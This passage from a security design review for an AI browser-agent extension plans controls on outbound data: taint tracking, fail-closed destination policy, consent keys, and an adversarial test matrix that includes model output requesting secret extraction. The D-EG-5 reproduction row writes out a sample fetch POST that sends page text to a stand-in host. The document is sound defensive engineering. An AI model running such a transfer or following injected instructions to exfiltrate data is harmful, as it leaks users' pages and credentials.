| --------------------------------------- | -------------- | ---------------- | ---------- | ------------------ | ----------------------- | ------------------ |
| `API_PROVIDER`                          | Yes            | task-level       | R1+        | endpoint allowlist | provider + model        | **must be**        |
| `WEB_AI_PROVIDER`                       | Yes            | **per transfer** | R2+        | origin             | provider + origin + tab | **must be**        |
| `WEB_PAGE` (form submit)                | Yes            | R2 today         | R2         | yes                | origin                  | partially          |
| `CONNECTOR` / `MCP_SERVER` / `PLUGIN`   | Yes            | per scope        | R2+        | yes                | service identity        | **must be**        |
| `DOWNLOAD` / `LOCAL_FILE` / `CLIPBOARD` | Yes            | per action       | R2+        | n/a                | path / target           | **must be**        |

**Destination is not the tool.** A tool _performs_ a transfer; the destination
is the boundary that must be evaluated. One tool may reach several
destinations, and the same destination may be reachable from several tools.

### Generalising `writeDestination`

Today it is a bare `string` (`tool-types.ts:65`) interpreted as a URL or site.
That is insufficient. Minimum generic model:

```text
{ type, identity, origin, purpose, dataCategories, consentRef, riskLevel }
```

with `type` from the taxonomy above. `writeDestination = AI_PROVIDER` is
explicitly **not** sufficient: provider identity, origin and the account/session
context all change the decision.

### Fail-closed rule

For any outbound transfer, **BLOCK** when the destination is unknown, its
identity cannot be determined, provenance is missing, taint cannot be computed,
consent state is missing or expired, or destination policy cannot be evaluated.
Unknown must never mean allow. This is the opposite of the current situation,
where an undeclared destination means _no evaluation at all_.

### Data categories that may never leave

Credentials, passwords, cookies, session tokens, OAuth tokens, API keys and
browser credential-store data. `payloadContainsSecret`
(`exfiltration-guard.ts:56`) already blocks credential-shaped payloads
unconditionally at `verdict: 'block'` — verified in code and covered by
`exfiltration.test.ts`. That control is sound; it is simply never reached.

### Isolation key

Smallest correct boundary: **(task, destination identity)**. A consent granted
in task A must not apply to task B, and consent for provider X must not apply
to provider Y. Tab and frame are properties of the _source_, already captured
by taint `site`; they do not belong in the consent key, because the same tab
may legitimately feed different destinations under different grants.

**Provider switching re-establishes consent.** API→WEB, WEB→WEB and X→Y all
require a fresh grant; no authorization is inherited.

### Required, before any egress capability

1. Persist accumulated taint with the task (Defect 2) — extends `TaskStore`
2. Declare `writeDestination` on every outbound path (Defect 1)
3. Generalise the destination model as above
4. Pin `MODEL_OUTPUT_WEB_UI` to `untrusted_external_content` (Defect 3)
5. Represent consent as (task, destination) with expiry
6. Emit taint for screenshots and model output
7. Record egress evidence: timestamp, task, source provenance, destination,
   provider, origin, tab/frame, data category, consent state, policy and risk
   decision, allow/block, result — with **payload hash, size and summary, never
   the raw payload**, and never a secret

### D-EG-4 — the guard allows on empty taint, whatever the destination

Independent of Defect 1. In `evaluateExfiltration` (`exfiltration-guard.ts:98`)
the `foreignSources` filter runs over `request.taint`. When taint is empty the
filter yields an empty array and the function returns `verdict: 'allow'`
(`exfiltration-guard.ts:123-131`) — for **any** destination, without inspecting
it. Only `payloadContainsSecret` runs first.

So an empty taint set is treated as positive evidence of safety rather than as
absence of evidence. Combined with Defect 2 — which guarantees taint is empty
after an eviction — the two compose into a fail-open: restart the worker, and
the guard affirmatively allows a transfer it would previously have held for
confirmation.

Note the guard is _not_ fail-open on an unparseable destination: when
`destinationSiteOf` returns `null`, tainted sources are all treated as foreign
(`exfiltration-guard.ts:119`) and the verdict is `confirm`. That part is sound.
The defect is specifically the empty-taint path.

### D-EG-5 — no structural restriction on outbound network access (WEAKNESS, not an active defect)

Verified in the manifest and the lint configuration:

| Control                 | Current value                          | Restricts egress        |
| ----------------------- | -------------------------------------- | ----------------------- |
| `host_permissions`      | `["http://*/*", "https://*/*"]`        | No — any host reachable |
| CSP `extension_pages`   | `script-src 'self'; object-src 'self'` | No `connect-src` set    |
| `no-restricted-globals` | `eval` only                            | No `fetch`/`WebSocket`  |
| Module boundary         | none                                   | any module may `fetch`  |

Consequence for the declaration model: adding `channel: 'none'` to a tool is an
**assertion**, not an enforcement. A tool that declares no egress and then calls
`fetch()` reaches any origin, and nothing in the build, the manifest or the
runtime observes it. A declaration-only design does not close D-EG-1; it
documents it.

**Full record, and a correction to its severity.** The B2 readiness review
inventoried every outbound mechanism in the tree (§4J) and found **one network
call site in the whole of `src/`**. D-EG-5 therefore has _zero current
instances_. It is recorded as a **weakness** — an absent defence-in-depth
control — not as an active defect, and it is deliberately ranked below D-EG-1,
D-EG-2 and D-EG-4, which are live.

| Field               | Content                                                                                                                                      |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| **Exact defect**    | Nothing in the manifest, CSP, lint configuration or module structure prevents an arbitrary module from originating outbound network traffic  |
| **Root cause**      | `host_permissions` is a wildcard; CSP declares no `connect-src`; `no-restricted-globals` lists only `eval`; no egress module boundary exists |
| **Affected code**   | `public/manifest.json` (`host_permissions`, `content_security_policy`), `eslint.config.js:42-45`                                             |
| **Bypass path**     | A future tool, connector, MCP client or plugin calls `fetch()` directly; policy never evaluates it; the request reaches any origin           |
| **Security impact** | Enables D-EG-1 to recur after it is fixed. On its own it exfiltrates nothing — no code takes the path today                                  |
| **Reproduction**    | Add `await fetch('https://example.invalid', {method:'POST', body:pageText})` to any tool's `execute`; it succeeds; no policy record appears  |
| **Remediation**     | B2.5 lint rule (extends the existing `eval` precedent) plus B2.6 interceptor; CSP `connect-src` recorded as not viable — see §4J             |
| **Regression test** | Adversarial tests A and B: a tool that declares no egress and calls `fetch` must be blocked at the interceptor and must fail the lint build  |

One control does hold: CSP omits `unsafe-eval` and a service worker has no DOM,
so there is no realistic way for extension code to recover a pristine `fetch`
once the global has been replaced. That makes runtime interception in the worker
**enforceable**, which is why the recommended model below is not declaration
alone.

### Refinement to D-EG-3 — the ranking functions are currently uncalled

`higherAuthority` and `canIssueInstructions` (`untrusted-content.ts:36,40`) are
exported and unit-tested (`tests/security/prompt-injection.test.ts:84-96`) but
**invoked nowhere in `src/`** — verified by search. Today `TrustLevel` is used
only as a label: an envelope attribute in `wrapUntrusted` and a field on
`EvidenceReference` (`evidence-model.ts:32`).

This narrows the defect without excusing it. `canIssueInstructions` already
returns `false` for `authenticated_application`, so the ordering does not
currently grant instruction authority to a Web AI provider. The risk is that
the ladder is a single scalar: the first consumer that reads the rank for an
_egress_ or _content-trust_ decision inherits an ordering designed for
instruction authority, where `authenticated_application` outranks
`untrusted_external_content`. The fix is to split the dimensions before a
consumer exists, not to reorder a ladder that other logic depends on.

### Recommended enforcement model

Declaration alone (option A) is insufficient per D-EG-5. Interception alone
cannot see `chrome.*` egress or content-script DOM writes. The minimum robust
model is a **combination**, in this order of load-bearing weight:

1. **Runtime interception (E) — primary.** Replace `globalThis.fetch`,
   `WebSocket` and `XMLHttpRequest` in the service-worker entry, before any
   other module is evaluated, with a wrapper that resolves the calling egress
   context and denies when none is present. Enforceable because CSP forbids
   `eval` and the worker has no DOM.
2. **Central wrapping (B) — primary for `chrome.*`.** `chrome.*` is already
   near-centralised: `chrome-adapter.ts` (tabs, scripting, windows, tabGroups),
   `debugger-manager.ts`, `storage-area.ts`, `bus.ts`, `notifier.ts`. Five
   chokepoints, not a scattered surface. Egress-capable members —
   `tabs.update`, `tabs.create`, `scripting.executeScript`, `downloads` — route
   through the same evaluator.
3. **Static checking (D) — supporting.** Extend the existing
   `no-restricted-globals` rule (precedent: `eval`) to `fetch`,
   `XMLHttpRequest`, `WebSocket` and `sendBeacon` outside an allowlisted egress
   module. Cheap, and it fails the build rather than the runtime.
4. **Explicit declaration (A) — supporting.** Still required, because the
   interceptor needs a declared destination to compare the actual one against.
   Its value is _detecting mismatch_, not preventing egress.
5. **Structural restriction (C) — partial only.** CSP `connect-src` cannot be
   narrowed usefully while the provider base URL is user-configurable
   (localhost model servers, OpenRouter, Azure gateways all differ). Record as
   a limitation; revisit if provider endpoints ever become a fixed set.

**Declared vs actual.** With (1) and (2) the system compares the declaration
against the destination actually passed to the primitive, and denies on
mismatch — declaration is checked, not trusted.

**Documented limitation.** Interception is complete for the service-worker
context only. A content script that performs its own `fetch`, or an injected
page-world script, executes outside the worker and cannot be intercepted by it.
The mitigation is boundary, not interception: content scripts must remain
message-passing only and must not originate network calls, enforced by (3) plus
review. This limitation is intrinsic to MV3 and is recorded rather than solved.

### Service-worker eviction test — feasible today

`tests/e2e/mv3-lifecycle.spec.ts` already terminates the worker deterministically
via `Target.closeTarget` on the worker's CDP target (`killServiceWorker`), and
three tests depend on it — including one proving a task runs after restart. The
B2 eviction test needs no new mechanism: create a task, read a confidential
page, kill the worker, resume, attempt egress, assert the restriction survives.
This is real forced termination, not a simulation.

### Ordering

Inbound today: policy (step 3) → execute (step 5) → redact (step 6,
`redactValue`). Correct for results entering model context. **There is no
outbound point at all.** Egress evaluation must sit _before_ the outbound
action, inside the extension boundary — never after the network call. Redaction
must not run before provenance is assigned, or it would erase the lineage the
policy depends on; the card-number defect showed redaction can corrupt
identifiers, and provenance identifiers must be excluded from it.

**Correct outbound order.** classification -> provenance/taint resolution ->
destination resolution (actual, not declared) -> policy -> consent -> redaction
of the outbound payload -> execute -> evidence. Redaction sits _after_ policy
on the outbound path, the reverse of the inbound path, because a redacted
payload must not be able to change an authorization decision. Redaction is a
minimisation control, never an authorization one: a redacted payload is still
tainted, and a sanitised value is still untrusted.

### Security monotonicity — mandatory invariant

> **A security restriction must never become less restrictive solely because
> runtime state was lost, rebuilt, summarised, redacted, or transferred.**

Taint is **append-only for the task lifetime**. Permitted: untainted -> tainted.
Prohibited: tainted -> untainted by worker restart, browser restart, task
rehydration, provider change, tab change, context rebuild, model
summarisation, redaction, or truncation.

No operation removes taint. Task completion ends the lifetime; it does not
clear it. This is deliberately stricter than necessary — a monotonic set needs
no invalidation logic, and invalidation logic is where fail-open lives.

Smallest design that guarantees no fail-open: persist the taint set on the
task record, write it through `TaskStore.updateTask` at the same point
evidence ids are already persisted, and make the in-memory array
append-only. Versioning, checksums and event-sourced reconstruction are
**not** required: the store is extension-local, the threat model is a lost
write rather than a tampering adversary, and a checksum over data an attacker
in that position could also rewrite adds no security. Rejected as
over-engineering. One requirement does apply — a task record that predates
the field, or whose taint cannot be read, must be treated as
**maximally tainted**, never as untainted.

### Trust and provenance as independent dimensions

A single scalar cannot express "authenticated source, untrusted content".
Split:

| Dimension      | Answers                           | Example                            |
| -------------- | --------------------------------- | ---------------------------------- |
| **Trust**      | may this issue instructions?      | `system_policy` .. `untrusted`     |
| **Provenance** | where did this content come from? | `MODEL_OUTPUT_WEB_UI` via `origin` |

Minimum provenance vocabulary: `SYSTEM_CONTROLLED_DATA`, `USER_INTENT`,
`UNTRUSTED_EXTERNAL_CONTENT`, `MODEL_OUTPUT_API`, `MODEL_OUTPUT_WEB_UI`,
`TOOL_RESULT`.

**Invariant.** _Origin authentication does not authenticate the semantic
content of the provider output._ Authenticating a channel proves who the
counterparty is. It proves nothing about what the counterparty said, and a
model's output is not more trustworthy for having arrived over TLS from a
logged-in session. `MODEL_OUTPUT_WEB_UI` can therefore never gain trust
because the provider is authenticated, is an official provider, the user is
logged in, the content came from a model, or the response looks structured.

**Provenance transformation.** A model is a transformer, not a source. Output
provenance = its own direct provenance **plus the union of the taint of every
input**. Minimum representation per unit of content:

```text
{ direct: ProvenanceKind, parents: ProvenanceRef[], taint: TaintSource[] }
```

So `WEB_PAGE_CONTENT -> Web AI -> MODEL_OUTPUT_WEB_UI` carries the page's
taint, and `LOCAL_FILE -> API provider -> MODEL_OUTPUT_API` carries the file's.
A model must never erase the provenance of what it was given.

### Multiple destinations per task

One task reaches several destinations — read page, send to provider, receive
output, navigate elsewhere, submit a form. `writeDestination` is singular per
request and cannot express this. The model is a **sequence of egress events**,
each independently evaluated, each with its own evidence record. Per-request
singularity is retained only as the shape of one event, never as the shape of
the task.

### B2 acceptance criteria

B2 is PASS only when all fifteen hold. Existence of a type, a field or a
passing unit test is not evidence for any of them.

| #   | Criterion                                           | Evidence required               |
| --- | --------------------------------------------------- | ------------------------------- |
| 1   | Every outbound destination has a security boundary  | enumeration + interception test |
| 2   | Missing destination metadata cannot bypass policy   | adversarial test A, B           |
| 3   | Taint survives lifecycle restart                    | real Chromium eviction test     |
| 4   | Trust cannot be elevated by provider authentication | unit + adversarial test G       |
| 5   | Provenance cannot be erased by model transformation | unit test on transformation     |
| 6   | Provider requests cannot bypass policy              | adversarial test P              |
| 7   | Web AI DOM injection treated as outbound transfer   | design + test (gated with D4)   |
| 8   | Consent is destination-specific                     | adversarial test E, I           |
| 9   | Provider switching re-evaluates authorization       | adversarial test I              |
| 10  | Task/tab/frame isolation enforced                   | adversarial test J, K           |
| 11  | Real Chromium lifecycle coverage                    | `mv3-lifecycle` extension       |
| 12  | Adversarial tests exist for identified bypasses     | matrix A-P                      |
| 13  | Evidence records the security decision              | evidence schema + assertion     |
| 14  | Credentials/secrets remain prohibited               | tests L, M, N                   |
| 15  | Documentation reflects actual enforcement           | doc review against code         |

### B2 implementation plan — atomic changes

Not implemented. Ordered so that each step is independently reviewable and no
step leaves the tree in a weaker state than it found it.

| ID       | Change                                                       | Files likely affected                                         | Invariant protected             | Tests                          | Compatibility                          | Risk   |
| -------- | ------------------------------------------------------------ | ------------------------------------------------------------- | ------------------------------- | ------------------------------ | -------------------------------------- | ------ |
| **B2.1** | Persist taint on the task; treat unreadable taint as maximal | `task-model.ts`, `task-store.ts`, `agent-runtime.ts`          | monotonicity (Defect 2)         | unit + eviction E2E            | additive field; old records = tainted  | Low    |
| **B2.2** | Make the runtime taint array append-only                     | `agent-runtime.ts`                                            | monotonicity                    | unit                           | none                                   | Low    |
| **B2.3** | Fix empty-taint allow; unknown = deny                        | `exfiltration-guard.ts`, `policy-engine.ts`                   | fail-closed (Defect 4)          | unit, tests A-F                | **behavioural** - may add confirms     | Medium |
| **B2.4** | Split trust from provenance; pin `MODEL_OUTPUT_WEB_UI`       | `untrusted-content.ts`, `evidence-model.ts`                   | no laundering (Defect 3)        | unit, test G                   | `TrustLevel` retained; provenance new  | Medium |
| **B2.5** | Generalise destination to the structured model               | `tool-types.ts`, `policy-engine.ts`, `tool-registry.ts`       | destination identity            | unit                           | `writeDestination` string -> object    | Medium |
| **B2.6** | Egress interceptor in the worker entry + lint rule           | `service-worker.ts`, new egress module, `eslint.config.js`    | no undeclared egress (Defect 1) | tests A, B, C                  | must load first; lint may fail build   | High   |
| **B2.7** | Route provider requests through the evaluator                | `agent-runtime.ts`, `openai-compatible.ts`, provider registry | no privileged side channel      | test P + provider E2E          | provider calls may now require consent | High   |
| **B2.8** | Consent keyed (task, destination identity) with expiry       | permission engine, `policy-engine.ts`, side panel             | consent specificity             | tests E, I, J                  | new prompt surface                     | Medium |
| **B2.9** | Egress evidence records (hash/size/summary, never payload)   | `evidence-model.ts`, evidence store                           | auditability                    | assertion in every egress test | additive evidence type                 | Low    |

Highest risk is **B2.7**: bringing provider egress under policy changes a path
that currently always succeeds. It must land behind the evidence and consent
work, not before it, or a policy bug becomes a total loss of function.

### Adversarial egress test matrix

All expected results for unsafe cases are **BLOCK**. None implemented.

| ID  | Scenario                                     | Expected                            |
| --- | -------------------------------------------- | ----------------------------------- |
| A   | Undeclared `fetch` from a tool               | BLOCK at interceptor                |
| B   | Declared `channel: none` + actual network    | BLOCK + declaration-mismatch record |
| C   | Declared destination A, actual destination B | BLOCK on actual                     |
| D   | Missing provenance on outbound payload       | BLOCK (fail-closed)                 |
| E   | Missing/expired consent                      | BLOCK, prompt                       |
| F   | Taint absent after worker restart            | restriction retained; never relaxed |
| G   | Web AI output re-enters as trusted           | trust pinned untrusted              |
| H   | Model output asks for secret extraction      | BLOCK, no credential read           |
| I   | Provider switched mid-task                   | re-evaluate; prior consent void     |
| J   | Tab A consent reused for tab B egress        | BLOCK                               |
| K   | Frame-level authorization leak               | BLOCK                               |
| L   | Credential-shaped payload                    | BLOCK (guard already does)          |
| M   | API-key payload                              | BLOCK                               |
| N   | Session-token payload                        | BLOCK                               |
| O   | Redaction used to clear a policy block       | redaction does not change verdict   |
| P   | Provider request issued outside tool policy  | BLOCK / routed through evaluator    |

---

## 4J. B2 Implementation Readiness — verified inventory and design corrections

A final pre-implementation pass inventoried every outbound mechanism by
inspecting call sites, not by trusting the earlier design. It **corrected three
elements of the B2.1-B2.9 design** and materially reduced the estimated scope.

### Complete outbound channel inventory (verified at call sites)

Repository-wide search of `src/`, each hit opened and read.

| Mechanism                                                                                                         | Instances  | Classification                   | Evidence                                                                                                                              |
| ----------------------------------------------------------------------------------------------------------------- | ---------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `fetch`                                                                                                           | **1 site** | **EXTERNAL EGRESS**              | `openai-compatible.ts:89` via injected `fetchImpl`                                                                                    |
| `XMLHttpRequest`, `WebSocket`, `EventSource`                                                                      | 0          | UNUSED                           | no occurrence in `src/`                                                                                                               |
| `sendBeacon`, `WebTransport`, `navigator.*`                                                                       | 0          | UNUSED                           | no occurrence in `src/`                                                                                                               |
| Third-party HTTP client / provider SDK                                                                            | 0          | UNUSED                           | runtime deps are `react`, `react-dom`, `zod` only                                                                                     |
| `chrome.tabs.update` / `.create` with a URL                                                                       | 3          | **EXTERNAL EGRESS**              | `chrome-adapter.ts` — URL can carry data                                                                                              |
| Content-script `performType` + `requestSubmit()`                                                                  | 1          | **EXTERNAL EGRESS**              | `interaction-engine.ts:196`                                                                                                           |
| Content-script `element.click()` activation                                                                       | 1          | **EXTERNAL EGRESS**              | `interaction-engine.ts:142` — submits forms, follows links                                                                            |
| `chrome.scripting.executeScript`                                                                                  | 1          | NOT AN EGRESS                    | `chrome-adapter.ts:220` injects a **fixed** bundled file, never `func` or model text                                                  |
| `chrome.debugger.sendCommand`                                                                                     | 1          | NOT AN EGRESS                    | `ALLOWED_CDP_METHODS` is read-only + screenshot; **no** `Page.navigate`, `Runtime.evaluate`, `Fetch.*`, `Network.setExtraHTTPHeaders` |
| `chrome.storage`                                                                                                  | 7          | INTERNAL EGRESS                  | extension-local only                                                                                                                  |
| `chrome.runtime` / `chrome.tabs.sendMessage`                                                                      | 10         | INTERNAL EGRESS                  | worker <-> panel <-> content script                                                                                                   |
| `chrome.notifications`                                                                                            | 3          | INTERNAL EGRESS                  | visible to the user, leaves no boundary                                                                                               |
| `chrome.downloads`                                                                                                | 0          | UNUSED                           | optional permission, never called                                                                                                     |
| `chrome.cookies`, `identity`, `webRequest`, `declarativeNetRequest`, `offscreen`, `history`, `bookmarks`, `proxy` | 0          | UNUSED — **not in the manifest** | never requested                                                                                                                       |
| `postMessage`, clipboard, `execCommand`, `DataTransfer`, file input, `createObjectURL`, iframe                    | 0          | UNUSED                           | no occurrence in `src/`                                                                                                               |

**Consequence — the egress surface is four mechanisms, not a broad API
surface**: one `fetch` site, tab navigation, form submission, and click
activation. The last three already pass through the tool pipeline; only
`fetch` does not.

### Extension security boundary

| Component                             | Position       | Egress policy applies when                                                                            |
| ------------------------------------- | -------------- | ----------------------------------------------------------------------------------------------------- |
| Service worker                        | INSIDE         | it is the enforcement point                                                                           |
| Side panel                            | INSIDE         | same origin, same extension; panel <-> worker is not egress                                           |
| Content script                        | **EDGE**       | inside the extension's isolated world, but its DOM writes act on OUTSIDE code — every write is egress |
| Page world                            | OUTSIDE        | always                                                                                                |
| Target website                        | OUTSIDE        | always                                                                                                |
| API provider                          | OUTSIDE        | always, including a localhost model server                                                            |
| Web AI provider                       | OUTSIDE        | always; authentication does not move it inside                                                        |
| Connector / MCP / plugin              | OUTSIDE        | always                                                                                                |
| Browser UI (notifications, tab strip) | INSIDE-VISIBLE | user-visible only; not a data destination                                                             |

The content script is the subtle case: it is trusted _code_ in an untrusted
_context_. Trusting it to execute faithfully is not the same as treating its
target as inside the boundary.

### Runtime interception feasibility — answered A-K

| #   | Question                                      | Answer                                                                                                                                                                                                                                                    |
| --- | --------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| A   | Every provider request through the wrapper?   | **Yes, and more simply than assumed** — `fetchImpl` is a constructor parameter (`openai-compatible.ts:89`) and the only construction site is `openAICompatibleFactory.create()`. Inject a guarded fetch there; no global patching needed for current code |
| B   | Unwrapped reference obtainable first?         | Not by current code. The default binds at _construction_, not module evaluation, so a wrapper installed in the worker entry is already in place                                                                                                           |
| C   | Imported modules capture the original?        | Possible in principle; prevented in practice by B2.5's lint rule plus the single-chokepoint structure                                                                                                                                                     |
| D   | Dynamically loaded code bypass?               | No — CSP is `script-src 'self'`, no `unsafe-eval`, and `no-restricted-globals` already bans `eval`                                                                                                                                                        |
| E   | Browser APIs producing traffic without these? | **Yes** — `chrome.tabs.update`, content-script form submit and click activation. These are why interception alone is insufficient                                                                                                                         |
| F   | Extension-internal traffic affected?          | No — `chrome.runtime`/`tabs.sendMessage` do not use `fetch`                                                                                                                                                                                               |
| G   | Localhost provider traffic?                   | Yes, and it must be: a localhost model server is OUTSIDE the boundary. It is evaluated, not exempted                                                                                                                                                      |
| H   | Tests affected?                               | Yes — the mock provider is reached over `fetch`. Tests inject their own `fetchImpl`, so the injection design is test-compatible; a global patch would need an explicit test allowance                                                                     |
| I   | Service-worker startup affected?              | The wrapper must be installed before any module that could call out. `service-worker.ts` already performs ordered startup                                                                                                                                 |
| J   | MV3 CSP affected?                             | No — wrapping a global is not a CSP operation                                                                                                                                                                                                             |
| K   | Extension update behaviour?                   | No — each worker start re-runs the entry, so the wrapper is reinstalled every lifecycle                                                                                                                                                                   |

> **Interception is defence-in-depth, not the sole security boundary.**
> It cannot see `chrome.*` navigation, content-script DOM writes, or anything
> executing in the page world. The primary controls are the tool pipeline for
> browser actions and constructor injection for the provider.

### CSP `connect-src` — recorded as not viable

The provider base URL is user-configurable by design (localhost model servers,
OpenRouter, Azure gateways, self-hosted vLLM). A static manifest CSP cannot
enumerate them without reducing to `https://*`, which restricts nothing.
Recorded as a limitation; revisit only if provider endpoints become fixed.

### Correction 1 — the consent key is insufficient

§4I proposed **(task, destination identity)**. That is not enough. It permits
exactly the failure the review is meant to prevent: the user approves sending
_one_ page, the task then reads a second, more sensitive page, and the existing
grant still matches because task and destination are unchanged.

Minimum sufficient key: **(task, destination identity, taint-set signature)** —
a stable hash over the set of taint sources present when consent was granted.
Any new taint source changes the signature and invalidates the grant. This adds
one hash, no new subsystem, and it closes the scope-creep path.

**Provider authorization and data-transfer authorization are distinct.**
Connecting a provider authorizes the _channel_. It authorizes no particular
_payload_. Every transfer is evaluated against the key above regardless of how
long the provider has been connected.

**Revocation.** The grant is void on: provider change, model change, logout or
session expiry, destination change, tab origin change, any taint-set growth,
sensitivity increase, explicit user revocation, and policy change. Nothing
inherits. Expiry is a backstop, not the mechanism.

### Correction 2 — empty taint needs three states, not two

D-EG-4 must not be fixed by treating empty taint as unsafe; that would block
normal internal operations. The defect is that **one value encodes two
meanings**. Separate them:

| State             | Meaning                                        | Egress decision      |
| ----------------- | ---------------------------------------------- | -------------------- |
| `KNOWN_UNTAINTED` | provenance established; nothing sensitive read | evaluate normally    |
| `TAINTED(set)`    | provenance established; sources listed         | evaluate against set |
| `UNKNOWN`         | provenance not established, or unreadable      | **fail closed**      |

> **Missing security metadata is never evidence that data is safe.**

Representation: taint becomes a record `{ complete: boolean, sources: [] }`.
`complete: false` is `UNKNOWN`. A task record written before the field exists
reads back as `UNKNOWN`, which is why the migration is safe by default and why
the field must not simply reuse the existing `taint: []` shape — today `[]`
means "never written", and that must not silently become `KNOWN_UNTAINTED`.

### Correction 3 — concurrency is already solved; the constraint is _how_ to write

The lost-update race is real in principle but **already mitigated by existing
infrastructure**. `SerializedStorageArea` (`storage-area.ts:149`) wraps a
`KeyedMutex`, `transaction()` holds the lock across a full read-modify-write
(`storage-area.ts:175-182`), `NamespacedStorageArea` delegates to it
(`:128-131`), and the worker constructs every store over it
(`service-worker.ts:54-59`). `TaskStore.updateTask` already routes through
`update()` -> `transaction()`.

The binding constraint for B2.1 is therefore narrow and must be stated:

> Taint is appended **inside `TaskStore.updateTask`'s mutator**, never by
> building a task object in memory and calling `saveTask`. `saveTask` uses
> `area.set` directly (`task-store.ts:41`) — a blind overwrite that **would**
> lose a concurrent update.

No new locking, no versioning, no CRDT. One rule.

### Persistence failure behaviour

`updateTask` currently returns `undefined` and logs a warning when the record
is missing (`task-store.ts:69-72`) — silent continuation. Insufficient for
security state.

| Condition                   | Required behaviour                                   |
| --------------------------- | ---------------------------------------------------- |
| Write fails / throws        | **PAUSE** the task; surface to the user; no egress   |
| Task record missing         | **FAIL** the task                                    |
| Old schema / no taint field | treat as `UNKNOWN` -> fail closed on the next egress |
| Malformed taint             | treat as `UNKNOWN` -> fail closed                    |
| Lost update                 | prevented by the mutator rule above                  |
| Concurrent updates          | serialised by `KeyedMutex`                           |

PAUSE rather than FAIL for a write failure because the PAUSED state and its
recovery path already exist and are proven in real Chromium
(`mv3-lifecycle.spec.ts`). Work is preserved; egress is not permitted.

### Browser actions — when an action is egress

| Action                                       | Egress?          | Destination      | Consent          | Risk |
| -------------------------------------------- | ---------------- | ---------------- | ---------------- | ---- |
| A. Click a static button                     | No               | —                | tool policy only | R1   |
| B. Navigate to a static URL                  | No               | —                | tool policy only | R1   |
| C. Navigate with tainted query/fragment/path | **Yes**          | target origin    | per transfer     | R3   |
| D. Fill a form with tainted data             | **Yes** (staged) | target origin    | at submit        | R2   |
| E. Submit a form                             | **Yes**          | target origin    | per transfer     | R3   |
| F. Upload a local file                       | **Yes**          | target origin    | per transfer     | R4   |
| G. Inject text into a Web AI prompt          | **Yes**          | provider origin  | per transfer     | R3   |
| H. Clipboard write                           | **Yes**          | user/OS boundary | per transfer     | R2   |
| I. `postMessage`                             | **Yes**          | frame origin     | per transfer     | R3   |
| J. Download                                  | **Yes**          | local filesystem | per transfer     | R2   |

F, H, I and J are **not implemented and not reachable today** (verified above);
they are specified so the classification exists before the capability does.
D is staged rather than transferred: the value sits in the DOM and leaves at E.

### Tool risk and data egress are evaluated separately

A tool's risk level answers "how damaging is this action?". Egress answers
"what data is leaving, to where?". `browser.navigate` is R1 with a static URL
and an R3 egress with a tainted query. Neither substitutes for the other; both
are evaluated, and the stricter verdict wins.

### Revised implementation order

Reordered from §4I after the inventory. Rationale: the fail-closed evaluator
must not land before the state it reads is trustworthy, and provider
integration moved **earlier** because constructor injection proved far cheaper
than the global-patch estimate.

| Order | Step                                                              | Was    | Why it moved                                              |
| ----- | ----------------------------------------------------------------- | ------ | --------------------------------------------------------- |
| 1     | Taint persistence via the `updateTask` mutator, three-state model | B2.1/2 | nothing else is sound until state survives                |
| 2     | Provenance/trust separation, `MODEL_OUTPUT_WEB_UI` pinned         | B2.4   | the evaluator needs the vocabulary                        |
| 3     | Structured destination model                                      | B2.5   | the evaluator needs destination identity                  |
| 4     | Evidence records (hash/size/category/summary, never payload)      | B2.9   | **moved earlier** — every later step must be observable   |
| 5     | Fail-closed evaluator, `UNKNOWN` -> deny, empty-taint fix         | B2.3   | now reads trustworthy state and can be observed           |
| 6     | Provider request through the evaluator via injected fetch         | B2.7   | **moved earlier** — one constructor argument, not a patch |
| 7     | Consent (task, destination, taint signature) with revocation      | B2.8   | needs the evaluator and destination model                 |
| 8     | Egress interceptor + lint rule (defence-in-depth)                 | B2.6   | **moved later** — closes D-EG-5, a weakness, not a defect |
| 9     | Adversarial tests 1-26                                            | —      | after behaviour is stable                                 |
| 10    | Real Chromium E2E                                                 | —      | last                                                      |

### Properties that must be verified in real Chromium

Unit tests cannot establish any of these:

1. Provider request actually routed through the evaluator (real `fetch`)
2. Service-worker termination via `Target.closeTarget` — mechanism proven
3. Task rehydration carrying taint across that termination
4. Browser-action egress: navigation with a tainted query, form submit
5. Tab isolation: a grant in tab A not honoured for tab B
6. Persistence failure producing PAUSE, not silent continuation

Web AI DOM egress is **not** listed: it is gated with D4 and no implementation
exists to test.

### Readiness verdict

**READY FOR B2 IMPLEMENTATION**, on the corrected design.

The basis is not that a design exists. It is that this review closed the open
design questions and verified the enabling infrastructure is already present:
the mutex that makes append-only persistence safe, the proven worker-termination
mechanism, and a single injectable network chokepoint. Three design elements
were found wrong and corrected here rather than during coding.

Not blocking B2: Q1 provider terms remain `TERMS UNVERIFIED`. They gate D4 and
D5 only. B2 is provider-independent and proceeds.

---

## 4L. B2 Implementation — delivered

Implemented against the §4K contract. What follows records what was built,
what the build discovered, and where it deviates from the frozen design.

### Modules added

| Module                                       | Role                                                  |
| -------------------------------------------- | ----------------------------------------------------- |
| `src/security/taint/taint-state.ts`          | three-state task taint, monotone, canonical signature |
| `src/security/egress/destination.ts`         | structured destinations, canonical identity           |
| `src/security/egress/carrier.ts`             | carrier capacity grading                              |
| `src/security/egress/consent.ts`             | consent keys, grants, provider binding                |
| `src/security/egress/egress-gate.ts`         | the single authorization point                        |
| `src/security/egress/egress-evidence.ts`     | decision records with keyed digests                   |
| `src/security/egress/provider-transport.ts`  | guarded transport, injected at `factory.create()`     |
| `src/security/egress/network-interceptor.ts` | worker-scope defence in depth                         |

### Defects the implementation uncovered

**D-EG-6 — `payloadContainsSecret` ignored each rule's `confirm` predicate.**
`VERIFIED IN CODE`, now fixed. It tested `rule.pattern` alone, so the
card-number rule — which carries an issuer-prefix and Luhn check precisely
because shape over-matches — fired on any run of 13 to 19 digits. A provider
body containing a timestamp was refused as a credential, which would have
blocked every request the product makes. Both entry points now share one
`confirm`-aware implementation so they cannot drift apart again.

**D-EG-7 — a JSON-quoted key slipped past the named-secret rule.**
`VERIFIED IN CODE`, now fixed. `named-secret-assignment` required the key to
be followed directly by `:` or `=`, so `"session_token":"…"` in a serialised
body did not match while `session_token=…` did. Serialised bodies are exactly
what the gate inspects. The separator group now tolerates a closing quote.

**D-EG-8 — `javascript:` and `data:` URLs canonicalised to a destination.**
`VERIFIED IN CODE`, now fixed. They parse as URLs, so they produced an
identity and could have been consented to. They are execution and inlining
